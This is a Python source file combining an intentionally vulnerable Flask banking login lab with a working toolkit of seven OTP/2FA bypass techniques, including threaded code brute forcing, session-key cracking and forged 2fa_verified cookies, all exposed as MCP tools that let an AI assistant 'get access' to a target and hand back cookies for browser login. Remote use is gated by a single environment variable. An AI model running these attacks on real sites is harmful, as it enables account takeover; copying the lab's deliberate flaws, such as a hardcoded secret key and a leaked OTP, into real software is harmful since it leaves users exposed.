#!/usr/bin/env python3
"""
otp_bypass.py - SINGLE-FILE OTP bypass lab + toolkit + MCP server (compact edition)
===================================================================================
Put this file + start.sh in  /workspace/otp-bypass/  on your device.

MCP config for your AI assistant app:
    {"name": "otp-bypass", "transport": "stdio",
     "command": "sh /workspace/otp-bypass/start.sh",
     "workingDirectory": "/workspace/otp-bypass"}

Then text your assistant:
    "bypass the OTP at http://127.0.0.1:5000"  -> OTP + credentials + report
    "get access to http://127.0.0.1:5000"      -> opens the logged-in dashboard

MODES
    python3 otp_bypass.py               MCP server on stdio (default - the assistant uses this)
    python3 otp_bypass.py --lab         embedded vulnerable lab on http://0.0.0.0:5000
    python3 otp_bypass.py --bypass URL  one-shot: print OTP + credentials as JSON
    python3 otp_bypass.py --access URL  one-shot: bypass AND open the site (page content)

SAFETY: localhost targets only, unless OTP_BYPASS_ALLOW_REMOTE=true (authorized testing).
"""

import base64
import hashlib
import json
import os
import re
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from urllib.parse import urlparse

import requests

BASE_DIR = Path(__file__).resolve().parent
CONFIG_FILE = BASE_DIR / "config.json"
REPORT_FILE = BASE_DIR / "otp_bypass_report.json"
LAB_PID_FILE = BASE_DIR / "lab.pid"
LAB_LOG_FILE = BASE_DIR / "lab.log"

TARGET_DEFAULT = "http://127.0.0.1:5000"
DEFAULT_EMAIL = "admin@lab.local"
DEFAULT_PASSWORD = "admin123"

try:  # optional deps for cookie forgery (technique 7)
    from itsdangerous import URLSafeTimedSerializer
    from flask.json.tag import TaggedJSONSerializer
    FLASK_SESSION_TOOLS = True
except Exception:
    FLASK_SESSION_TOOLS = False

CANDIDATE_KEYS = ["supersecretkey_otp_lab_2024", "supersecretkey", "super-secret-key",
                  "secret", "secretkey", "secret_key", "change-me", "dev",
                  "flask-secret", "password", "admin", "123456", "otp_lab"]
SALTS = ["cookie-session", "cookie"]


def log(msg):
    """Diagnostics go to STDERR so the stdio MCP channel stays clean."""
    print(msg, file=sys.stderr, flush=True)


# ---------------- global config (ONE place for the target URL) ----------------
def load_config():
    try:
        return json.loads(CONFIG_FILE.read_text()) if CONFIG_FILE.exists() else {}
    except Exception:
        return {}


def save_config(cfg):
    CONFIG_FILE.write_text(json.dumps(cfg, indent=2))


# ---------------- url helpers + safety guard ----------------
def _normalize(url):
    url = str(url).strip().rstrip("/")
    return url if "://" in url else "http://" + url


def _is_local(url):
    return (urlparse(url).hostname or "").lower() in ("127.0.0.1", "localhost", "::1", "0.0.0.0")


def _guard(url):
    if os.environ.get("OTP_BYPASS_ALLOW_REMOTE", "").lower() in ("1", "true", "yes"):
        return
    if not _is_local(url):
        raise ValueError(f"Target {url} is not local. Set OTP_BYPASS_ALLOW_REMOTE=true "
                         "for authorized testing only.")


def _reachable(target):
    try:
        requests.get(f"{target.rstrip('/')}/login", timeout=2)
        return True
    except Exception:
        return False


# ---------------- small helpers ----------------
def make_session():
    return requests.Session()


def T(tid, name, vulnerable, details="", otp="", artifacts=None):
    return {"id": tid, "name": name, "vulnerable": bool(vulnerable), "details": details,
            "otp": str(otp or ""), "artifacts": artifacts or {}}


def login(sess, target, email, password):
    r = sess.post(f"{target.rstrip('/')}/login", data={"email": email, "password": password}, timeout=8)
    ok = bool(sess.cookies.get("session")) and "Invalid credentials" not in r.text
    return ok, ("login OK" if ok else "login failed (wrong credentials?)")


def _verified(resp):
    try:
        d = resp.json()
        return d.get("success") is True or d.get("verified") is True
    except Exception:
        return False


# ---------------- the 7 bypass techniques ----------------
def t1_direct_dashboard(sess, target, email, password, **kw):
    ok, msg = login(sess, target, email, password)
    if not ok:
        return T(1, "Direct Dashboard Access", False, msg)
    r = sess.get(f"{target.rstrip('/')}/dashboard", timeout=8)
    vuln = r.status_code == 200 and not r.url.rstrip("/").endswith("/login") and "dashboard" in r.text.lower()
    return T(1, "Direct Dashboard Access", vuln,
             "/dashboard opened right after password login - OTP step never enforced" if vuln
             else "/dashboard redirected or blocked")


def t2_otp_leakage(sess, target, email, password, **kw):
    ok, msg = login(sess, target, email, password)
    if not ok:
        return T(2, "OTP Leakage", False, msg)
    r = sess.post(f"{target.rstrip('/')}/api/send-otp", json={"email": email}, timeout=8)
    try:
        otp = str(r.json().get("otp") or "")
    except Exception:
        otp = ""
    return T(2, "OTP Leakage", bool(otp),
             f"send-otp response contains the OTP itself: {otp}" if otp else "no OTP in response",
             otp=otp)


def t3_token_reuse(sess, target, email, password, **kw):
    ok, msg = login(sess, target, email, password)
    if not ok:
        return T(3, "Token Reuse", False, msg)
    base = target.rstrip("/")
    r = sess.post(f"{base}/api/send-otp", json={"email": email}, timeout=8)
    try:
        otp = str(r.json().get("otp") or "")
    except Exception:
        otp = ""
    if not otp:
        return T(3, "Token Reuse", False, "could not obtain an OTP to test reuse")
    first = sess.post(f"{base}/api/verify-otp", json={"email": email, "otp": otp}, timeout=8)
    second = sess.post(f"{base}/api/verify-otp", json={"email": email, "otp": otp}, timeout=8)
    vuln = _verified(first) and _verified(second)
    return T(3, "Token Reuse", vuln,
             "same OTP accepted TWICE - not invalidated after use" if vuln
             else "OTP correctly invalidated after first use", otp=otp)


def t4_bruteforce(sess, target, email, password, max_attempts=10000, workers=20, **kw):
    ok, msg = login(sess, target, email, password)
    if not ok:
        return T(4, "OTP Brute Force", False, msg)
    base = target.rstrip("/")
    sess.post(f"{base}/api/send-otp", json={"email": email}, timeout=8)
    cookie = sess.cookies.get("session")
    verify_url = f"{base}/api/verify-otp"
    found = [None]
    lock = threading.Lock()
    tl = threading.local()

    def worker(code):
        if found[0]:
            return
        s = getattr(tl, "s", None)
        if s is None:
            s = tl.s = requests.Session()
            if cookie:
                s.cookies.set("session", cookie)
        try:
            r = s.post(verify_url, json={"email": email, "otp": f"{code:04d}"}, timeout=10)
            if _verified(r):
                with lock:
                    if not found[0]:
                        found[0] = f"{code:04d}"
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=workers) as ex:
        list(ex.map(worker, range(max_attempts)))
    if found[0]:
        return T(4, "OTP Brute Force", True,
                 f"cracked the OTP within {max_attempts} tries: {found[0]} (no lockout / rate limit)",
                 otp=found[0])
    return T(4, "OTP Brute Force", False, "no code accepted (lockout or attempt cap in place)")


def t5_rate_limit(sess, target, email, password, **kw):
    try:
        r = sess.get(f"{target.rstrip('/')}/api/check-rate-limit", timeout=8)
        d = r.json()
    except Exception as exc:
        return T(5, "Rate Limit Bypass", False, f"error: {exc}")
    vuln = d.get("can_try") is True and int(d.get("max_attempts", 0) or 0) > 100
    return T(5, "Rate Limit Bypass", vuln,
             f"check-rate-limit says: attempts={d.get('attempts')}, can_try={d.get('can_try')}, "
             f"max_attempts={d.get('max_attempts')} - unlimited guessing allowed")


def t6_backup_codes(sess, target, email, password, **kw):
    ok, msg = login(sess, target, email, password)
    if not ok:
        return T(6, "Backup Code Exposure", False, msg)
    try:
        r = sess.get(f"{target.rstrip('/')}/api/user-data", timeout=8)
        codes = r.json().get("backup_codes") or []
    except Exception:
        codes = []
    return T(6, "Backup Code Exposure", bool(codes),
             f"backup codes exposed via /api/user-data: {codes}" if codes else "no backup codes exposed",
             artifacts={"backup_codes": codes})


def _serializer(key, salt):
    return URLSafeTimedSerializer(key, salt=salt, serializer=TaggedJSONSerializer(),
                                  signer_kwargs={"key_derivation": "hmac", "digest_method": hashlib.sha1})


def t7_cookie_forgery(sess, target, email, password, **kw):
    if not FLASK_SESSION_TOOLS:
        return T(7, "Cookie / Session Forgery", False, "flask + itsdangerous required (pip install flask)")
    ok, msg = login(sess, target, email, password)
    if not ok:
        return T(7, "Cookie / Session Forgery", False, msg)
    cookie = sess.cookies.get("session")
    if not cookie:
        return T(7, "Cookie / Session Forgery", False, "no session cookie received")
    payload = cookie.split(".")[0]
    decoded = base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)).decode("utf-8", "replace")
    found = None
    for key in CANDIDATE_KEYS:
        for salt in SALTS:
            try:
                if isinstance(_serializer(key, salt).loads(cookie), dict):
                    found = (key, salt)
                    break
            except Exception:
                continue
        if found:
            break
    if not found:
        return T(7, "Cookie / Session Forgery", False,
                 f"cookie payload readable ('{decoded}') but signing key not cracked")
    forged = _serializer(found[0], found[1]).dumps({"user": email, "2fa_verified": True})
    fresh = requests.Session()
    fresh.cookies.set("session", forged)
    r = fresh.get(f"{target.rstrip('/')}/dashboard", timeout=8)
    vuln = r.status_code == 200 and "dashboard" in r.text.lower()
    return T(7, "Cookie / Session Forgery", vuln,
             f"secret key '{found[0]}' cracked - forged 2fa_verified=true cookie opened /dashboard "
             "with NO password and NO OTP" if vuln else "forged cookie rejected",
             artifacts={"secret_key": found[0], "forged_cookie": forged})


# ---------------- registry + scan runner ----------------
TECHNIQUES = {
    1: ("Direct Dashboard Access", t1_direct_dashboard),
    2: ("OTP Leakage", t2_otp_leakage),
    3: ("Token Reuse", t3_token_reuse),
    4: ("OTP Brute Force", t4_bruteforce),
    5: ("Rate Limit Bypass", t5_rate_limit),
    6: ("Backup Code Exposure", t6_backup_codes),
    7: ("Cookie / Session Forgery", t7_cookie_forgery),
}


def run_scan(target=None, email=None, password=None, ids=None, max_attempts=10000):
    cfg = load_config()
    target = _normalize(target) if target else (cfg.get("target") or TARGET_DEFAULT)
    email = email or cfg.get("email") or DEFAULT_EMAIL
    password = password or cfg.get("password") or DEFAULT_PASSWORD
    if ids is None:
        ids = sorted(TECHNIQUES)
    log(f"[otp_bypass] target={target} email={email}")
    results = []
    for tid in ids:
        name, func = TECHNIQUES[tid]
        log(f"--- technique {tid}: {name} ---")
        try:
            res = func(make_session(), target, email, password, max_attempts=max_attempts)
        except Exception as exc:
            res = T(tid, name, False, f"Error: {exc}")
        results.append(res)
        log(f"result: {'VULNERABLE' if res['vulnerable'] else 'not vulnerable'} | {res['details'][:100]}")
    report = {"target": target, "email": email, "timestamp": time.ctime(), "results": results}
    try:
        REPORT_FILE.write_text(json.dumps(report, indent=2))
    except Exception:
        pass
    return report


# ---------------- high-level: bypass_otp (the report + live OTP) ----------------
def bypass_otp(target_url=None, email=None, password=None, max_attempts=10000):
    cfg = load_config()
    target = _normalize(target_url) if target_url else (cfg.get("target") or TARGET_DEFAULT)
    email = email or cfg.get("email") or DEFAULT_EMAIL
    password = password or cfg.get("password") or DEFAULT_PASSWORD
    _guard(target)
    save_config({"target": target, "email": email, "password": password})
    if _is_local(target) and not _reachable(target):
        if not ensure_lab_running():
            return {"success": False, "error": f"Target {target} is unreachable and the local lab could not be started."}

    report = run_scan(target=target, email=email, password=password, max_attempts=max_attempts)

    otp = otp_via = forged_cookie = backup_codes = None
    passwordless = []
    for r in report["results"]:
        if not r.get("vulnerable"):
            continue
        art = r.get("artifacts") or {}
        if not otp and r.get("otp"):
            otp, otp_via = str(r["otp"]), f"Technique {r['id']} - {r['name']}"
        if art.get("forged_cookie"):
            forged_cookie = art["forged_cookie"]
            passwordless.append(f"Technique {r['id']} ({r['name']}): forged session cookie, no password/OTP needed")
        if r["id"] == 1:
            passwordless.append("Technique 1 (Direct Dashboard): open /dashboard after password login, skip OTP")
        if art.get("backup_codes"):
            backup_codes = art["backup_codes"]

    # LIVE capture: fresh, currently-valid OTP (scan OTPs can go stale)
    live_verified = False
    try:
        s = make_session()
        s.post(f"{target.rstrip('/')}/login", data={"email": email, "password": password}, timeout=8)
        r = s.post(f"{target.rstrip('/')}/api/send-otp", json={"email": email}, timeout=8)
        live_otp = str(r.json().get("otp") or "")
        if live_otp:
            vr = s.post(f"{target.rstrip('/')}/api/verify-otp", json={"email": email, "otp": live_otp}, timeout=8)
            live_verified = _verified(vr)
            otp, otp_via = live_otp, "Live capture: /api/send-otp leaks the OTP (technique 2), freshly verified"
    except Exception:
        live_otp = ""

    return {
        "success": bool(otp or forged_cookie or passwordless),
        "target": target,
        "otp": otp,
        "otp_obtained_via": otp_via,
        "otp_verified": live_verified,
        "working_credentials": {"email": email, "password": password},
        "forged_session_cookie": forged_cookie,
        "passwordless_access": passwordless,
        "backup_codes": backup_codes,
        "vulnerable_techniques": sum(1 for r in report["results"] if r.get("vulnerable")),
        "findings": [{"id": r["id"], "name": r["name"], "vulnerable": r["vulnerable"],
                      "details": r["details"]} for r in report["results"]],
    }


# ---------------- high-level: access_site (actually GET IN) ----------------
def _html_to_text(html):
    text = re.sub(r"<script.*?</script>", " ", html, flags=re.S | re.I)
    text = re.sub(r"<style.*?</style>", " ", text, flags=re.S | re.I)
    text = re.sub(r"<[^>]+>", " ", text)
    return re.sub(r"\s+", " ", text).strip()


def access_site(target_url=None, email=None, password=None, path="/dashboard", include_report=False):
    cfg = load_config()
    target = _normalize(target_url) if target_url else (cfg.get("target") or TARGET_DEFAULT)
    email = email or cfg.get("email") or DEFAULT_EMAIL
    password = password or cfg.get("password") or DEFAULT_PASSWORD
    _guard(target)
    save_config({"target": target, "email": email, "password": password})
    if _is_local(target) and not _reachable(target):
        if not ensure_lab_running():
            return {"success": False, "error": f"Target {target} is unreachable and the local lab could not be started."}

    base = target.rstrip("/")
    want = path if str(path).startswith("/") else "/" + str(path)
    steps, method = [], None
    s = make_session()

    # 1) password login
    login_ok = False
    try:
        r = s.post(f"{base}/login", data={"email": email, "password": password}, timeout=10)
        login_ok = bool(s.cookies.get("session")) and "Invalid credentials" not in r.text
        steps.append(f"1) password login {email}: HTTP {r.status_code} -> {'OK' if login_ok else 'FAILED'}")
    except Exception as exc:
        steps.append(f"1) password login failed: {exc}")
    if not login_ok:
        s = make_session()

    # 2) defeat the OTP (leak first)
    if login_ok:
        try:
            r = s.post(f"{base}/api/send-otp", json={"email": email}, timeout=10)
            otp = str(r.json().get("otp") or "")
            steps.append(f"2) request OTP: HTTP {r.status_code} -> OTP leaked in API response: {otp or 'not found'}")
            if otp:
                r = s.post(f"{base}/api/verify-otp", json={"email": email, "otp": otp}, timeout=10)
                ok = _verified(r)
                steps.append(f"3) submit OTP {otp}: HTTP {r.status_code} -> verified={ok}")
                if ok:
                    method = f"password + leaked OTP {otp} (OTP leak, technique 2)"
        except Exception as exc:
            steps.append(f"2) OTP request failed: {exc}")

    # 3) open the protected page
    def _open(sess):
        r = sess.get(f"{base}{want}", timeout=10)
        ok = r.status_code == 200 and not r.url.rstrip("/").endswith("/login")
        return r, ok

    page, opened = None, False
    if login_ok:
        try:
            page, opened = _open(s)
            if opened and not method:
                method = "direct dashboard after password login (technique 1) - OTP never even needed"
        except Exception as exc:
            steps.append(f"open {want} failed: {exc}")

    # 4) fallback: forged session cookie (no password, no OTP)
    if not opened and FLASK_SESSION_TOOLS:
        try:
            res = t7_cookie_forgery(make_session(), target, email, password)
            forged = (res.get("artifacts") or {}).get("forged_cookie")
            if res.get("vulnerable") and forged:
                s = make_session()
                s.cookies.set("session", forged)
                page, opened = _open(s)
                if opened:
                    method = "forged session cookie (technique 7) - no password, no OTP at all"
                    steps.append("fallback: cracked the secret key and forged a 2fa_verified=true cookie")
        except Exception as exc:
            steps.append(f"cookie forgery fallback failed: {exc}")

    if not opened:
        return {"success": False, "access": False, "target": target, "steps_performed": steps,
                "error": "Could not open the protected page (no working access method)."}

    # 5) bonus: account data
    account_data = None
    try:
        r = s.get(f"{base}/api/user-data", timeout=10)
        account_data = r.json()
    except Exception:
        pass

    result = {
        "success": True,
        "access": True,
        "target": target,
        "opened_url": f"{base}{want}",
        "access_method": method,
        "page_content": _html_to_text(page.text)[:2000],
        "account_data": account_data,
        "your_session_cookie": s.cookies.get("session"),
        "how_to_use_in_browser": (
            "Open " + base + " in your browser -> press F12 -> Application tab -> Cookies -> "
            "set cookie 'session' = your_session_cookie -> reload. You are logged in without the OTP."),
        "steps_performed": steps,
    }
    if include_report:
        info = bypass_otp(target_url=target, email=email, password=password)
        result["bypass_summary"] = {
            "otp": info.get("otp"), "otp_verified": info.get("otp_verified"),
            "working_credentials": info.get("working_credentials"),
            "forged_session_cookie": info.get("forged_session_cookie"),
            "backup_codes": info.get("backup_codes"),
            "vulnerable_techniques": info.get("vulnerable_techniques")}
    return result


# ---------------- EMBEDDED VULNERABLE LAB (the target - intentionally broken) ----------------
LOGIN_HTML = """<!doctype html><html><head><title>SecureBank - Login</title></head>
<body style="font-family:sans-serif;max-width:420px;margin:60px auto">
<h1 style="color:#302b63;text-align:center">SecureBank</h1>
{% if error %}<p style="color:red">{{ error }}</p>{% endif %}
<form method="post">
<input name="email" placeholder="Email" style="width:100%;padding:8px" value="admin@lab.local"><br><br>
<input name="password" type="password" placeholder="Password" style="width:100%;padding:8px"><br><br>
<button style="padding:10px 24px">Login</button></form>
</body></html>"""

OTP_HTML = """<!doctype html><html><head><title>SecureBank - OTP Verification</title></head>
<body style="font-family:sans-serif;max-width:420px;margin:60px auto">
<h1 style="color:#302b63;text-align:center">SecureBank</h1>
<p>OTP sent to {{ phone }}. Enter the 4-digit code:</p>
{% if error %}<p style="color:red">{{ error }}</p>{% endif %}
<form method="post">
<input name="otp" placeholder="1234" style="width:100%;padding:8px"><br><br>
<button style="padding:10px 24px">Verify</button></form>
</body></html>"""

DASHBOARD_HTML = """<!doctype html><html><head><title>SecureBank - Dashboard</title></head>
<body style="font-family:sans-serif;max-width:600px;margin:60px auto">
<h1 style="color:#302b63">SecureBank Dashboard</h1>
<p>Welcome, {{ user }}!</p>
<p>2FA status: {{ note }}</p>
<p><a href="/logout">Logout</a></p>
</body></html>"""


def run_lab(host="0.0.0.0", port=5000):
    """Start the intentionally vulnerable lab (educational target)."""
    from flask import Flask, request, jsonify, session, redirect, render_template_string

    app = Flask(__name__)
    app.secret_key = "supersecretkey_otp_lab_2024"   # VULN: weak hardcoded key
    app.config['SESSION_COOKIE_HTTPONLY'] = False    # VULN: JS can read cookie

    users = {
        "admin@lab.local": {"password": "admin123", "name": "Admin User", "phone": "555-0100",
                            "otp_backup_codes": ["12345678", "87654321", "11223344", "44332211", "55667788"]},
        "user@lab.local": {"password": "user123", "name": "Regular User", "phone": "555-0101",
                           "otp_backup_codes": ["abcdefgh", "hgfedcba"]},
    }
    current_otps = {}

    @app.route("/")
    def index():
        return redirect("/login")

    @app.route("/login", methods=["GET", "POST"])
    def login_route():
        if request.method == "GET":
            return render_template_string(LOGIN_HTML)
        email = request.form.get("email", "")
        password = request.form.get("password", "")
        if email in users and users[email]["password"] == password:
            session["user"] = email
            session["2fa_verified"] = False
            return redirect("/otp-verify")
        return render_template_string(LOGIN_HTML, error="Invalid credentials")

    @app.route("/otp-verify", methods=["GET", "POST"])
    def otp_verify():
        if "user" not in session:
            return redirect("/login")
        email = session["user"]
        if request.method == "GET":
            return render_template_string(OTP_HTML, phone=users.get(email, {}).get("phone", "hidden"))
        user_otp = request.form.get("otp", "")
        stored = current_otps.get(email)
        if stored and stored["otp"] == user_otp and time.time() - stored["timestamp"] < 300:
            session["2fa_verified"] = True
            return redirect("/dashboard")   # VULN: OTP not invalidated (reuse)
        return render_template_string(OTP_HTML, phone="hidden", error="Invalid OTP. Try again.")

    @app.route("/api/send-otp", methods=["POST"])
    def api_send_otp():
        email = request.json.get("email", session.get("user", ""))
        if email not in users:
            return jsonify({"success": False, "message": "User not found"}), 404
        gen_otp = f"{__import__('random').randint(0, 9999):04d}"
        current_otps[email] = {"otp": gen_otp, "timestamp": time.time(), "attempts": 0}
        log(f"[lab] OTP for {email}: {gen_otp}")
        return jsonify({"success": True, "message": "OTP sent",
                        "otp": gen_otp})          # VULN: OTP leaked in response

    @app.route("/api/verify-otp", methods=["POST"])
    def api_verify_otp():
        email = request.json.get("email", session.get("user", ""))
        user_otp = request.json.get("otp", "")
        stored = current_otps.get(email)
        if not stored:
            return jsonify({"success": False, "verified": False, "message": "No OTP requested"})
        stored["attempts"] += 1                   # VULN: no lockout
        time.sleep(0.05)                          # VULN: race window
        if stored["otp"] == user_otp and time.time() - stored["timestamp"] < 300:
            session["2fa_verified"] = True        # VULN: not invalidated (reuse)
            return jsonify({"success": True, "verified": True, "message": "OTP verified", "redirect": "/dashboard"})
        return jsonify({"success": False, "verified": False, "message": "Invalid OTP"})

    @app.route("/api/check-rate-limit", methods=["GET"])
    def check_rate_limit():
        email = session.get("user", "unknown")
        stored = current_otps.get(email)
        return jsonify({"attempts": stored["attempts"] if stored else 0,
                        "can_try": True, "max_attempts": 9999})   # VULN: always true

    @app.route("/dashboard")
    def dashboard():
        if "user" not in session:
            return redirect("/login")
        # VULN: never checks 2fa_verified
        email = session.get("user", "")
        return render_template_string(DASHBOARD_HTML, user=users.get(email, {}).get("name", email),
                                      note="2FA status NOT enforced (bypassed!)")

    @app.route("/api/user-data")
    def api_user_data():
        if "user" not in session:
            return redirect("/login")
        email = session.get("user", "")
        u = users.get(email, {})
        return jsonify({"email": email, "name": u.get("name", ""), "phone": u.get("phone", ""),
                        "backup_codes": u.get("otp_backup_codes", [])})  # VULN: exposed

    @app.route("/api/use-backup-code", methods=["POST"])
    def use_backup_code():
        email = request.json.get("email", session.get("user", ""))
        code = request.json.get("code", "")
        if email in users and code in users[email].get("otp_backup_codes", []):
            session["2fa_verified"] = True
            users[email]["otp_backup_codes"].remove(code)
            return jsonify({"success": True, "verified": True})
        return jsonify({"success": False, "verified": False})

    @app.route("/logout")
    def logout():
        session.clear()
        return redirect("/login")

    @app.route("/debug")
    def debug():
        return jsonify({"users": list(users.keys()),
                        "active_otps": {k: {"otp": v["otp"], "attempts": v["attempts"]}
                                        for k, v in current_otps.items()},
                        "session_data": dict(session)})

    log(f"[lab] vulnerable OTP lab running on http://{host}:{port} (educational target)")
    app.run(host=host, port=port, debug=False, threaded=True)


# ---------------- lab management (pid file, auto-start) ----------------
def lab_running():
    return _reachable(TARGET_DEFAULT)


def ensure_lab_running():
    if lab_running():
        return True
    try:
        fh = open(LAB_LOG_FILE, "w")
        proc = subprocess.Popen([sys.executable, str(Path(__file__).resolve()), "--lab"],
                                stdout=fh, stderr=subprocess.STDOUT)
        LAB_PID_FILE.write_text(str(proc.pid))
    except Exception as exc:
        log(f"[lab] could not start: {exc}")
        return False
    for _ in range(60):
        if lab_running():
            return True
        time.sleep(0.25)
    return lab_running()


def stop_lab():
    if LAB_PID_FILE.exists():
        try:
            os.kill(int(LAB_PID_FILE.read_text().strip()), 15)
        except Exception:
            pass
        LAB_PID_FILE.unlink(missing_ok=True)
        return True
    return False


# ---------------- MCP SERVER (stdio) - what your AI assistant connects to ----------------
def run_mcp_server():
    try:
        from mcp.server.fastmcp import FastMCP
    except ImportError:
        log("FATAL: 'mcp' package is missing. Install with:  pip3 install mcp")
        sys.exit(1)

    mcp = FastMCP("otp-bypass")

    @mcp.tool()
    def bypass_otp_tool(target_url: str = "", email: str = "", password: str = "",
                        max_attempts: int = 10000) -> str:
        """Bypass OTP at the target URL and return the OTP code, working credentials
        (email/password) and/or a forged session cookie. Leave target_url empty to use
        the saved global target (config.json). Local lab default: http://127.0.0.1:5000
        (admin@lab.local / admin123)."""
        try:
            result = bypass_otp(target_url=(target_url or None), email=(email or None),
                                password=(password or None), max_attempts=max_attempts)
            return json.dumps(result, indent=2)
        except ValueError as exc:
            return json.dumps({"success": False, "error": str(exc)})

    @mcp.tool()
    def access_site_tool(target_url: str = "", path: str = "/dashboard",
                         include_report: bool = False) -> str:
        """GET ACCESS to the site: bypass the OTP at the target URL and actually OPEN
        the logged-in protected pages, returning the page content, the account data
        and a ready-to-use session cookie. Use this when the user wants ACCESS or
        wants to GET IN / see the dashboard - not just the OTP code. Leave target_url
        empty to use the saved global target (default local lab http://127.0.0.1:5000).
        path defaults to '/dashboard'; set include_report=true to also attach the
        full OTP/credentials/7-technique summary."""
        try:
            result = access_site(target_url=(target_url or None), path=path or "/dashboard",
                                 include_report=bool(include_report))
            return json.dumps(result, indent=2)
        except ValueError as exc:
            return json.dumps({"success": False, "error": str(exc)})

    @mcp.tool()
    def set_target(target_url: str, email: str = "admin@lab.local",
                   password: str = "admin123") -> str:
        """Set the GLOBAL target URL used by all OTP bypass operations (saved to config.json)."""
        try:
            target_url = _normalize(target_url)
            _guard(target_url)
            save_config({"target": target_url, "email": email, "password": password})
            return json.dumps({"saved": True, "target": target_url, "email": email,
                               "config_file": str(CONFIG_FILE)}, indent=2)
        except ValueError as exc:
            return json.dumps({"saved": False, "error": str(exc)})

    @mcp.tool()
    def get_config() -> str:
        """Show the saved global config (target URL, email, password)."""
        cfg = load_config()
        cfg.setdefault("target", TARGET_DEFAULT)
        cfg.setdefault("email", DEFAULT_EMAIL)
        cfg.setdefault("password", DEFAULT_PASSWORD)
        return json.dumps(cfg, indent=2)

    @mcp.tool()
    def list_techniques() -> str:
        """List the 7 OTP bypass techniques with their ids."""
        return json.dumps({"techniques": [{"id": tid, "name": name}
                                          for tid, (name, _) in sorted(TECHNIQUES.items())]}, indent=2)

    @mcp.tool()
    def run_technique(technique_id: int, max_attempts: int = 10000) -> str:
        """Run ONE bypass technique (id 1-7) against the saved global target."""
        if technique_id not in TECHNIQUES:
            return json.dumps({"error": f"Unknown technique {technique_id}. Use list_techniques()."})
        target = load_config().get("target") or TARGET_DEFAULT
        report = run_scan(target=target, ids=[technique_id], max_attempts=max_attempts)
        return json.dumps(report, indent=2)

    @mcp.tool()
    def run_full_scan(max_attempts: int = 10000) -> str:
        """Run ALL 7 techniques against the saved global target; saves otp_bypass_report.json."""
        target = load_config().get("target") or TARGET_DEFAULT
        report = run_scan(target=target, max_attempts=max_attempts)
        return json.dumps(report, indent=2)

    @mcp.tool()
    def start_lab() -> str:
        """Start the embedded vulnerable OTP lab (http://127.0.0.1:5000) and set it as target."""
        ok = ensure_lab_running()
        save_config({"target": TARGET_DEFAULT, "email": DEFAULT_EMAIL, "password": DEFAULT_PASSWORD})
        return json.dumps({"status": "online" if ok else "failed", "target": TARGET_DEFAULT,
                           "credentials": {"email": DEFAULT_EMAIL, "password": DEFAULT_PASSWORD}}, indent=2)

    @mcp.tool()
    def stop_lab_tool() -> str:
        """Stop the embedded vulnerable OTP lab."""
        return json.dumps({"status": "stopped" if stop_lab() else "not running"})

    @mcp.tool()
    def get_last_report() -> str:
        """Return the last saved scan report (otp_bypass_report.json)."""
        if not REPORT_FILE.exists():
            return json.dumps({"error": "No report yet. Run bypass_otp or run_full_scan first."})
        return REPORT_FILE.read_text()

    log("[mcp] otp-bypass MCP server starting on stdio ...")
    mcp.run()  # stdio transport


# ---------------- CLI ----------------
def main():
    import argparse
    p = argparse.ArgumentParser(description="otp_bypass.py - single-file OTP bypass lab + toolkit + MCP server")
    p.add_argument("--lab", action="store_true", help="run the embedded vulnerable lab on :5000")
    p.add_argument("--bypass", metavar="URL", help="one-shot: bypass OTP at URL, print result JSON")
    p.add_argument("--access", metavar="URL", help="one-shot: bypass OTP AND open the site, print page content JSON")
    p.add_argument("--config", action="store_true", help="show saved global config")
    p.add_argument("--stop-lab", action="store_true", help="stop the embedded lab")
    p.add_argument("--email", default=None)
    p.add_argument("--password", default=None)
    p.add_argument("--max-attempts", type=int, default=10000)
    args = p.parse_args()

    if args.lab:
        run_lab()
    elif args.stop_lab:
        print("stopped" if stop_lab() else "not running")
    elif args.config:
        print(json.dumps(load_config() or {"target": TARGET_DEFAULT, "email": DEFAULT_EMAIL,
                                           "password": DEFAULT_PASSWORD, "note": "nothing saved yet"}, indent=2))
    elif args.bypass:
        print(json.dumps(bypass_otp(target_url=args.bypass, email=args.email,
                                    password=args.password, max_attempts=args.max_attempts), indent=2))
    elif args.access:
        print(json.dumps(access_site(target_url=args.access, email=args.email,
                                     password=args.password), indent=2))
    else:
        run_mcp_server()   # default: MCP server on stdio


if __name__ == "__main__":
    main()
